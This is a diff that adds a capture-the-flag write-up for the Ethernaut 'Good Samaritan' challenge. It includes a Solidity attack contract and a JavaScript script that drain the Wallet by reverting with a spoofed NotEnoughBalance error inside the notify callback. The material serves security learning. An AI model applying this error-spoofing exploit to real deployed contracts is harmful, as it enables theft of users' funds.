@@ -804,5 +804,50 @@ tx = await forta.setDetectionBot(bot.address);
 await tx.wait()
 ```
 
+---
+
+## good samaritan
+
+Goal is to drain the funds from `Wallet`
+
+wallet's `transferRemainder` transfers all the tokens but is only called when player request donation via `requestDonation` and wallet raises `NotEnoughBalance()` error.
+
+The error is raised only when balance of coin is less than 10. To drain funds we need to raise the error even when the funds are not less than 10. 
+
+If tokens are not less than 10, `Coin` contract notify the requesting address if the that address is a contract. We can use this external call to game the contract.
+
+We can create a new contract to request donation which reverts on notify but it won't work because even `transferRemainder` will trigger notify, we shouldn't throw error at this point otherwise the transaction will revert. To bypass this issue, I checked the amount being transfered and selectively throw error.
+
+```solidity
+contract SamaritanHack is INotifyable{
+    error NotEnoughBalance();
+    function notify(uint256 amount) external {
+        if(amount == 10){
+            revert NotEnoughBalance();
+        } 
+    }
+
+    function requestDonation(address instance) external {
+        GoodSamaritan sm = GoodSamaritan(instance);
+        sm.requestDonation();
+    }
+}
+```
+
+```javascript
+const SamaritanHack = await hre.ethers.getContractFactory("SamaritanHack");
+samaritanHack = await SamaritanHack.deploy()
+await samaritanHack.deployed()
+
+tx = await samaritanHack.requestDonation(goodSamaritan.address)
+await tx.wait()
+```
+
+--- 
+---
+
+Thanks for reading. Hmu [@someshc8i](https://twitter.com/someshc8i) if you would like to discuss security, get a second opinion on a smart contract or any doubts regarding the ethernaut challenges and my solutions. Happy hacking!
+
+
 
 
